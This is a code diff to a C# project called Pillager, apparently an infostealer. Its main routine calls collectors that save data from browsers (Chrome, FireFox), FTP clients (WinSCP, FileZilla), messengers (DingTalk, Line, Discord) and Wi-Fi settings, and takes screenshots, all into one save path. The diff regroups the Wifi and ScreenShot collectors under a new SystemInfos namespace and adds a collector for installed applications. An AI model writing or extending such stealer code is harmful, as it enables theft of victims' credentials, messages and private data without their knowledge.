@@ -6,8 +6,8 @@ using Pillager.FTPs;
 using Pillager.Helper;
 using Pillager.Mails;
 using Pillager.Messengers;
-using Pillager.Others;
 using Pillager.Softwares;
+using Pillager.SystemInfos;
 using Pillager.Tools;
 
 namespace Pillager
@@ -59,10 +59,6 @@ namespace Pillager
             Chrome.Save(savepath);
             FireFox.Save(savepath);
 
-            //Others
-            Wifi.Save(savepath);
-            ScreenShot.Save(savepath);
-
             //FTP
             WinSCP.Save(savepath);
             FileZilla.Save(savepath);
@@ -98,6 +94,11 @@ namespace Pillager
             DingTalk.Save(savepath);
             Line.Save(savepath);
             Discord.Save(savepath);
+
+            //SystemInfos
+            Wifi.Save(savepath);
+            ScreenShot.Save(savepath);
+            InstalledApp.Save(savepath);
         }
     }
 }
